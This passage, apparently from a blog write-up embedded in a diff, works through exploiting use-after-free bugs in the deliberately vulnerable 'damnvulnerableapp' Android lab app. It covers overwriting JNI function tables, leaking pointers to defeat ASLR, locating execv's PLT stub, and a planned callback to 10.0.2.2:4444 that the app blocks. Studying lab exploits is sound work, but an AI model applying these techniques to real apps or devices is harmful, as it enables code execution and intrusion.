+&lt;span style="color:#f92672">[&lt;/span>16&lt;span style="color:#f92672">]&lt;/span> .data.rel.ro PROGBITS 0000000000c0aa40 80aa40 010b00 &lt;span style="color:#ae81ff">00&lt;/span> WA &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>
+...
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Note that I might have missed a &lt;em>vtable&lt;/em>, but this was enough to quit persuing the &lt;em>vtable&lt;/em> - approach. If we were able to call &lt;code>mprotect&lt;/code> on the &lt;em>vtables&lt;/em>, maybe it could be possible to make the &lt;em>vtables&lt;/em> writable. Although for this to work, we would need to find a function call that provides a virtual function with the exact parameters we need for &lt;code>mprotect&lt;/code>. Therefore, &lt;code>__thiscall&lt;/code> is again a challenge.&lt;/p>
+&lt;p>Luckily, there are other, globally available objects that contain important function pointers. This time, the target will be to abuse the sequence of &lt;code>JNIEnv&lt;/code> - function calls in a JNI function.&lt;/p>
+&lt;p>Observe that, if a JNI method is called (in this module), it will be called via a generic trampoline, i.e. via &lt;code>artQuickGenericJniTrampoline&lt;/code> in assembly in &lt;code>art_quick_generic_jni_trampoline&lt;/code>. The first parameter is &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/entrypoints/quick/quick_trampoline_entrypoints.cc;l=1936;drc=1e6140afcea4c0f4bd9480bcca29e7939a3999c9">ALWAYS&lt;/a> of type &lt;code>JNIEnv*&lt;/code>. The jni object is fetched via &lt;code>Thread::GetJniEnv&lt;/code>, which returns an instance of &lt;code>JNIEnvExt&lt;/code>.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">JniEnvExt&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">public&lt;/span> JNIEnv {...}
+...
+&lt;span style="color:#75715e">#if defined(__cplusplus)
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">typedef&lt;/span> _JNIEnv JNIEnv;
+&lt;span style="color:#75715e">#else
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">typedef&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">JNINativeInterface&lt;/span>&lt;span style="color:#f92672">*&lt;/span> JNIEnv;
+...
+&lt;span style="color:#75715e">#endif
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>...
+&lt;span style="color:#75715e">/*
+&lt;/span>&lt;span style="color:#75715e"> * C++ object wrapper.
+&lt;/span>&lt;span style="color:#75715e"> *
+&lt;/span>&lt;span style="color:#75715e"> * This is usually overlaid on a C struct whose first element is a
+&lt;/span>&lt;span style="color:#75715e"> * JNINativeInterface*. We rely somewhat on compiler behavior.
+&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
+&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">_JNIEnv&lt;/span> {
+&lt;span style="color:#75715e">/* do not rename this; it does not seem to be entirely opaque */&lt;/span>
+&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">JNINativeInterface&lt;/span>&lt;span style="color:#f92672">*&lt;/span> functions;
+...
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The definition of &lt;code>_JNIEnv&lt;/code> comes from &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:libnativehelper/include_jni/jni.h;drc=1e6140afcea4c0f4bd9480bcca29e7939a3999c9;l=489">here&lt;/a>. In structures, everything is public, therefore &lt;code>functions&lt;/code> is visible in &lt;code>JNIEnvExt&lt;/code>!&lt;/p>
+&lt;p>Then also observe that (see &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/jni/jni_env_ext.h;l=165">code&lt;/a>)&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c++" data-lang="c++">&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">JNIEnvExt&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">public&lt;/span> JNIEnv {
+...
+&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> JNINativeInterface&lt;span style="color:#f92672">*&lt;/span> table_override_ ...;
+...
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Using&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ readelf --wide --symbols libart.so | grep &lt;span style="color:#e6db74">&amp;#34;_ZN3art9JNIEnvExt15table_override_E&amp;#34;&lt;/span>
+3674: 0000000000e21cb8 &lt;span style="color:#ae81ff">8&lt;/span> OBJECT GLOBAL PROTECTED &lt;span style="color:#ae81ff">23&lt;/span> _ZN3art9JNIEnvExt15table_override_E
+10840: 0000000000e21cb8 &lt;span style="color:#ae81ff">8&lt;/span> OBJECT GLOBAL PROTECTED &lt;span style="color:#ae81ff">23&lt;/span> _ZN3art9JNIEnvExt15table_override_E
+$ readelf --wide --sections libart.so | grep .bss
+&lt;span style="color:#f92672">[&lt;/span>23&lt;span style="color:#f92672">]&lt;/span> .bss NOBITS 0000000000e1fbe0 81fbe0 003bb0 &lt;span style="color:#ae81ff">00&lt;/span> WA &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>yields that &lt;code>JNIEnvExt::table_override&lt;/code> is part of &lt;code>.bss&lt;/code>, which again implies that we can overwrite this pointer with the &lt;em>Write - What - Where&lt;/em> condition.&lt;/p>
+&lt;p>We can try to link both of the above together via &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/jni/jni_env_ext.cc;drc=1e6140afcea4c0f4bd9480bcca29e7939a3999c9;bpv=0;bpt=1;l=318">&lt;code>GetFunctionTable&lt;/code>&lt;/a>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">const&lt;/span> JNINativeInterface&lt;span style="color:#f92672">*&lt;/span> JNIEnvExt&lt;span style="color:#f92672">::&lt;/span>GetFunctionTable(&lt;span style="color:#66d9ef">bool&lt;/span> check_jni) {
+&lt;span style="color:#66d9ef">const&lt;/span> JNINativeInterface&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">override&lt;/span> &lt;span style="color:#f92672">=&lt;/span> JNIEnvExt&lt;span style="color:#f92672">::&lt;/span>table_override_;
+&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">override&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">nullptr&lt;/span>) {
+&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">override&lt;/span>;
+}
+&lt;span style="color:#66d9ef">return&lt;/span> check_jni &lt;span style="color:#f92672">?&lt;/span> GetCheckJniNativeInterface() &lt;span style="color:#f92672">:&lt;/span> GetJniNativeInterface();
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>and either &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/jni/jni_env_ext.cc;l=293;bpv=0;bpt=1">&lt;code>ThreadResetFunctionTable&lt;/code>&lt;/a>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">ThreadResetFunctionTable&lt;/span>(Thread&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">thread&lt;/span>, &lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span> arg ATTRIBUTE_UNUSED)
+REQUIRES(Locks&lt;span style="color:#f92672">::&lt;/span>jni_function_table_lock_) {
+JNIEnvExt&lt;span style="color:#f92672">*&lt;/span> env &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">thread&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetJniEnv();
+&lt;span style="color:#66d9ef">bool&lt;/span> check_jni &lt;span style="color:#f92672">=&lt;/span> env&lt;span style="color:#f92672">-&amp;gt;&lt;/span>IsCheckJniEnabled();
+env&lt;span style="color:#f92672">-&amp;gt;&lt;/span>functions &lt;span style="color:#f92672">=&lt;/span> JNIEnvExt&lt;span style="color:#f92672">::&lt;/span>GetFunctionTable(check_jni);
+env&lt;span style="color:#f92672">-&amp;gt;&lt;/span>unchecked_functions_ &lt;span style="color:#f92672">=&lt;/span> GetJniNativeInterface();
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>or &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/jni/jni_env_ext.cc;l=118">&lt;code>SetCheckJniEnabled&lt;/code>&lt;/a>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">void&lt;/span> JNIEnvExt&lt;span style="color:#f92672">::&lt;/span>SetCheckJniEnabled(&lt;span style="color:#66d9ef">bool&lt;/span> enabled) {
+check_jni_ &lt;span style="color:#f92672">=&lt;/span> enabled;
+MutexLock &lt;span style="color:#a6e22e">mu&lt;/span>(Thread&lt;span style="color:#f92672">::&lt;/span>Current(), &lt;span style="color:#f92672">*&lt;/span>Locks&lt;span style="color:#f92672">::&lt;/span>jni_function_table_lock_);
+functions &lt;span style="color:#f92672">=&lt;/span> GetFunctionTable(enabled);
+&lt;span style="color:#75715e">// Check whether this is a no-op because of override.
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (enabled &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> JNIEnvExt&lt;span style="color:#f92672">::&lt;/span>table_override_ &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">nullptr&lt;/span>) {
+LOG(WARNING) &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Enabling CheckJNI after a JNIEnv function table override is not functional.&amp;#34;&lt;/span>;
+}
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>So if either of the above functions was called with a modified &lt;code>JNIEnvExt::override_table_&lt;/code>, then the ART would overwrite the function table for all function calls performed via the first argument in a JNI function with pointers that we can control. An idea might be to redirect the function pointers to fitting gadgets&amp;hellip;&lt;/p>
+&lt;p>Notice that &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/jni/jni_env_ext.cc;l=293;bpv=0;bpt=1">&lt;code>ThreadResetFunctionTable&lt;/code>&lt;/a> is a callback invoked inside a &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/jni/jni_env_ext.cc;l=301">&lt;code>foreach&lt;/code> - method&lt;/a>, i.e.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">void&lt;/span> JNIEnvExt&lt;span style="color:#f92672">::&lt;/span>SetTableOverride(&lt;span style="color:#66d9ef">const&lt;/span> JNINativeInterface&lt;span style="color:#f92672">*&lt;/span> table_override) {
+MutexLock &lt;span style="color:#a6e22e">mu&lt;/span>(Thread&lt;span style="color:#f92672">::&lt;/span>Current(), &lt;span style="color:#f92672">*&lt;/span>Locks&lt;span style="color:#f92672">::&lt;/span>thread_list_lock_);
+MutexLock &lt;span style="color:#a6e22e">mu2&lt;/span>(Thread&lt;span style="color:#f92672">::&lt;/span>Current(), &lt;span style="color:#f92672">*&lt;/span>Locks&lt;span style="color:#f92672">::&lt;/span>jni_function_table_lock_);
+JNIEnvExt&lt;span style="color:#f92672">::&lt;/span>table_override_ &lt;span style="color:#f92672">=&lt;/span> table_override;
+&lt;span style="color:#75715e">// See if we have a runtime. Note: we cannot run other code (like JavaVMExt&amp;#39;s CheckJNI install
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// code), as we&amp;#39;d have to recursively lock the mutex.
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> Runtime&lt;span style="color:#f92672">*&lt;/span> runtime &lt;span style="color:#f92672">=&lt;/span> Runtime&lt;span style="color:#f92672">::&lt;/span>Current();
+&lt;span style="color:#66d9ef">if&lt;/span> (runtime &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">nullptr&lt;/span>) {
+runtime&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetThreadList()&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ForEach(ThreadResetFunctionTable, &lt;span style="color:#66d9ef">nullptr&lt;/span>);
+&lt;span style="color:#75715e">// Core Platform API checks rely on stack walking and classifying the caller. If a table
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// override is installed do not try to guess what semantics should be.
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> runtime&lt;span style="color:#f92672">-&amp;gt;&lt;/span>SetCorePlatformApiEnforcementPolicy(hiddenapi&lt;span style="color:#f92672">::&lt;/span>EnforcementPolicy&lt;span style="color:#f92672">::&lt;/span>kDisabled);
+}
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>which seems to be free of any references to &lt;code>this&lt;/code>. Calling this function would update the function tables of every thread, which is the optimal thing to have. The big problem is that there needs to be a thread that can execute this function without crashing. If a thread crashed and took down the entire app, we would not be able to get code execution, because the JNI function would not be called. So we need a thread that is &amp;ldquo;crash - resistent&amp;rdquo;&amp;hellip; Also, in order to create a copy of that function pointer table, we would need to write at least &lt;code>sizeof (struct JNINativeInterface) = 0x748 bytes&lt;/code>, i.e. roughly half a page. The probability to break the app by overwriting global variables to this extent can be assumed to be very high.&lt;/p>
+&lt;h4 id="alternative-idea-for-exploitation-of-useafterfreewritemodule">Alternative idea for exploitation of &lt;em>UseAfterFreeWriteModule&lt;/em>&lt;/h4>
+&lt;p>There is a symbol called &lt;code>execv&lt;/code> in the symbol table of &lt;code>libart.so&lt;/code>, whose value is &lt;code>0&lt;/code>. Thus there is a &lt;code>.plt&lt;/code> entry for this function. According to an experiment, the following code runs without an error in the emulator:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
+&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>
+&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
+{
+execv(&lt;span style="color:#e6db74">&amp;#34;/bin/sh&amp;#34;&lt;/span>, NULL);
+&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Therefore, only the first parameter needs to be a global variable. The second one can be &lt;code>NULL&lt;/code>! But we &lt;strong>cannot&lt;/strong> trigger execution of arbitrary commands, as they would need parameters. If we were able to drop an executable file on the device, we could be able to execute this file assuming the app is granted enough permissions to access the executable.&lt;/p>
+&lt;p>Seeing that the above approaches do not work or, which is more likely, are very time consuming, I decided to change the type of the vulnerability from a &lt;em>Write - What - Where&lt;/em> condition to an &lt;em>Execute&lt;/em> condition.&lt;/p>
+&lt;h2 id="exploitation-of-useafterfreeexecmodule">Exploitation of &lt;em>UseAfterFreeExecModule&lt;/em>&lt;/h2>
+&lt;p>The issue with this module is not just the leak (which is the same as in &lt;em>UseAfterFreeWriteModule&lt;/em>), but also the implementation of the key - value storage function:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">...
+obj &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">0x108&lt;/span>);
+&lt;span style="color:#f92672">*&lt;/span>(code &lt;span style="color:#f92672">**&lt;/span>)((&lt;span style="color:#66d9ef">long&lt;/span>)obj &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x100&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> FUN_00100c60;
+free(obj);
+keyValue &lt;span style="color:#f92672">=&lt;/span> (object &lt;span style="color:#f92672">*&lt;/span>)calloc(&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">0x108&lt;/span>);
+nameLength &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetArrayLength)(env,name);
+len &lt;span style="color:#f92672">=&lt;/span> (uint)nameLength;
+&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#ae81ff">0x100&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> len) {
+len &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x100&lt;/span>;
+}
+iscopy &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>;
+nameBytes &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetByteArrayElements)(env,name,&lt;span style="color:#f92672">&amp;amp;&lt;/span>iscopy);
+__memcpy_chk(keyValue,nameBytes,len,&lt;span style="color:#ae81ff">0xffffffffffffffff&lt;/span>);
+keyValue&lt;span style="color:#f92672">-&amp;gt;&lt;/span>value &lt;span style="color:#f92672">=&lt;/span> value;
+result &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(&lt;span style="color:#f92672">**&lt;/span>(code &lt;span style="color:#f92672">**&lt;/span>)((&lt;span style="color:#66d9ef">long&lt;/span>)obj &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x100&lt;/span>))(keyValue,&lt;span style="color:#ae81ff">0&lt;/span>);
+resultLength &lt;span style="color:#f92672">=&lt;/span> __strlen_chk(&lt;span style="color:#f92672">&amp;amp;&lt;/span>result,&lt;span style="color:#ae81ff">0xffffffffffffffff&lt;/span>);
+array &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>NewByteArray)(env,(jsize)resultLength);
+(&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>SetByteArrayRegion)(env,array,&lt;span style="color:#ae81ff">0&lt;/span>,(jsize)resultLength,(jbyte &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>result);
+...
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>In itself, only the fact that &lt;code>obj&lt;/code> is reused to call the function at &lt;code>obj + 0x100&lt;/code> seems to be an issue. Seeing that &lt;code>malloc(0x108)&lt;/code> and &lt;code>calloc(1, 0x108)&lt;/code> both allocate &lt;code>0x108&lt;/code> bytes, we can deduce (just as &lt;a href="#introducing-scudo-the-allocator">before&lt;/a>) that the same chunk is returned.&lt;/p>
+&lt;p>Now we just have to exploit this&amp;hellip;&lt;/p>
+&lt;h3 id="finding-a-better-obj--0x100">Finding a better &lt;em>obj + 0x100&lt;/em>&lt;/h3>
+&lt;p>From &lt;a href="#leaking-data">the first section&lt;/a> we get a bunch of pointers. E.g. this might look like this:&lt;/p>
+&lt;pre tabindex="0">&lt;code>[0]: 0x730b9d3c874e &amp;lt;-- ptr: &amp;quot;amazing_key&amp;quot;
+[1]: 0x730b9d3c875a &amp;lt;-- ptr: &amp;quot;secret_key&amp;quot;
+[2]: 0x730b9d3c8740 &amp;lt;-- ptr: &amp;quot;topsecret_key&amp;quot;
+[3]: 0x730b9d3c8765 &amp;lt;-- ptr: &amp;quot;a_very_very_long_key_with_fancy_features_:D&amp;quot;
+[4]: 0x730b9afdf9a0 &amp;lt;-- stack address: most likely examples
+[5]: 0x2147eb93990de82b &amp;lt;-- looks more like a canary
+[6]: 0x730b9afdf8d0 &amp;lt;-- stack address: stored rbp
+[7]: 0x730c0379ffac &amp;lt;-- return address
+&lt;/code>&lt;/pre>&lt;p>The first five addresses can be understood if one analyses &lt;code>lookupExamples&lt;/code>. The canary is often just a &lt;a href="https://link.springer.com/article/10.1007/s10207-018-00425-8">random 8 - byte value&lt;/a> that is pushed between a stack frame and the local variables. Depending on the canary type, this can be a terminator - canary, i.e. it contains e.g. a null - byte, or something else. On Android, it is a &lt;a href="https://link.springer.com/article/10.1007/s10207-018-00425-8">random canary&lt;/a>. Disassembling &lt;code>lookupExamples&lt;/code> yields&lt;/p>
+&lt;pre tabindex="0">&lt;code>gef➤ disassemble Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeExecModule_lookupExamples
+0x0000730b9d3c8990 &amp;lt;+0&amp;gt;: push rbp
+0x0000730b9d3c8991 &amp;lt;+1&amp;gt;: mov rbp,rsp
+0x0000730b9d3c8994 &amp;lt;+4&amp;gt;: sub rsp,0x70
+0x0000730b9d3c8998 &amp;lt;+8&amp;gt;: mov rax,QWORD PTR fs:0x28
+0x0000730b9d3c89a1 &amp;lt;+17&amp;gt;: mov QWORD PTR [rbp-0x8],rax
+...
+&lt;/code>&lt;/pre>&lt;p>and therefore the stack layout is as described above.&lt;/p>
+&lt;p>The problem is that we want to execute e.g. &lt;code>execve&lt;/code> or similar, but this function is not referenced in the module itself. This is where the return address comes into play. On my machine, &lt;code>art_quick_generic_jni_trampoline&lt;/code> is the function that calls &lt;code>lookupExamples&lt;/code>. This may depend on, among other things, the way the function is specified in the java code, i.e. it could be static or non - static. In this case, the return address is &lt;code>art_quick_generic_jni_trampoline+220&lt;/code>.&lt;/p>
+&lt;p>Running&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ readelf --wide --symbols libart.so | grep art_quick_generic_jni_trampoline
+7145: 000000000039fed0 &lt;span style="color:#ae81ff">378&lt;/span> FUNC LOCAL HIDDEN &lt;span style="color:#ae81ff">14&lt;/span> art_quick_generic_jni_trampoline
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>gives the offset &lt;code>0x39fed0&lt;/code>. Thus, the base address (mind &lt;em>ASLR&lt;/em>) of &lt;code>libart.so&lt;/code> is&lt;/p>
+&lt;pre tabindex="0">&lt;code>0x730c0379ffac - 220 - 0x39fed0 = 0x730c03400000
+&lt;/code>&lt;/pre>&lt;p>From now on, all code in &lt;code>libart.so&lt;/code> is also available to us. Remember that we can overwrite a function pointer, whose function is called with &lt;strong>two&lt;/strong> parameters&lt;/p>
+&lt;ol>
+&lt;li>&lt;code>keyValue&lt;/code>: pointer to a user - controlled string&lt;/li>
+&lt;li>&lt;code>&amp;lt;unknown&amp;gt;&lt;/code>: &lt;code>NULL&lt;/code>&lt;/li>
+&lt;/ol>
+&lt;p>We could gamble and hope that &lt;code>execve&lt;/code> works here, but most likely it will not. We again do not control enough parameters. Notice that looking for similar functions yields&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ readelf --wide --symbols libart.so | grep &lt;span style="color:#e6db74">&amp;#34;exec&amp;#34;&lt;/span>
+199: &lt;span style="color:#ae81ff">0000000000000000&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> FUNC GLOBAL DEFAULT UND execv@LIBC &lt;span style="color:#f92672">(&lt;/span>2&lt;span style="color:#f92672">)&lt;/span>
+200: &lt;span style="color:#ae81ff">0000000000000000&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> FUNC GLOBAL DEFAULT UND execve@LIBC &lt;span style="color:#f92672">(&lt;/span>2&lt;span style="color:#f92672">)&lt;/span>
+271: &lt;span style="color:#ae81ff">0000000000000000&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> FUNC GLOBAL DEFAULT UND _ZN3art10DupCloexecEi
+1304: &lt;span style="color:#ae81ff">0000000000000000&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> FILE LOCAL DEFAULT ABS exec_utils.cc
+8795: &lt;span style="color:#ae81ff">0000000000000000&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> FUNC GLOBAL DEFAULT UND execv
+8796: &lt;span style="color:#ae81ff">0000000000000000&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> FUNC GLOBAL DEFAULT UND execve
+10033: &lt;span style="color:#ae81ff">0000000000000000&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> FUNC GLOBAL DEFAULT UND _ZN3art10DupCloexecEi
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Looking up &lt;code>execv&lt;/code> reveals&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">execv&lt;/span>(&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>pathname, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#66d9ef">const&lt;/span> argv[]);
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>This time, lets try to at least get to the point where we can execute an arbitrary executable file that we provided, as is described in a &lt;a href="#alternative-idea-for-exploitation-of-useafterfreewritemodule">previous section&lt;/a>.&lt;/p>
+&lt;p>The attentive reader might have noticed that &lt;code>execv&lt;/code> does not have any offset, i.e. an offset of 0. Thus it will be resolved when the dynamic linker loads &lt;code>libart.so&lt;/code>. To solve that issue, we just have to figure out to which location a call to &lt;code>execv&lt;/code> transfers control. Introducing: &lt;code>.plt&lt;/code>!&lt;/p>
+&lt;p>One way to find the offset and thus the address of &lt;code>execv&lt;/code> is to search for calls of &lt;code>execv&lt;/code> in the binary. It turns out that &lt;code>ExecWithoutWait&lt;/code> calls &lt;code>execv&lt;/code>. Disassembling it yields:&lt;/p>
+&lt;pre tabindex="0">&lt;code>$ readelf --wide --symbols libart.so | grep ExecWithoutWait
+1305: 00000000004b6ac0 560 FUNC LOCAL DEFAULT 14 _ZN3art12_GLOBAL__N_115ExecWithoutWaitERNSt3__16vectorINS1_12basic_stringIcNS1_11char_traitsIcEENS1_9allocatorIcEEEENS6_IS8_EEEE
+gef➤ disassemble 0x4b6ac0 + 0x730c03400000
+...
+0x0000730c038b6bf8 &amp;lt;+312&amp;gt;: mov rsi,QWORD PTR [rsp+0x20]
+0x0000730c038b6bfd &amp;lt;+317&amp;gt;: mov rdi,r14
+0x0000730c038b6c00 &amp;lt;+320&amp;gt;: call 0x730c03e08f80 &amp;lt;--- symbol stub for execv
+0x0000730c038b6c05 &amp;lt;+325&amp;gt;: jmp 0x730c038b6c14 &amp;lt;_ZN3art12_GLOBAL__N_115ExecWithoutWaitERNSt3__16vectorINS1_12basic_stringIcNS1_11char_traitsIcEENS1_9allocatorIcEEEENS6_IS8_EEEE+340&amp;gt;
+...
+&lt;/code>&lt;/pre>&lt;p>As we know the base address of &lt;code>libart.so&lt;/code>, we can compute &lt;code>0x730c03e08f80 - 0x730c03400000 = 0xa08f80&lt;/code>. If we uploaded a test client shell script that connects to &lt;code>10.0.2.2:4444&lt;/code>, chose &lt;code>key = &amp;quot;/data/local/tmp/client&amp;quot;&lt;/code> and &lt;code>value=&amp;lt;address of execv&amp;gt;&lt;/code>, we would expect to get a connection&amp;hellip;but unfortunately, execution gets denied with an error:&lt;/p>
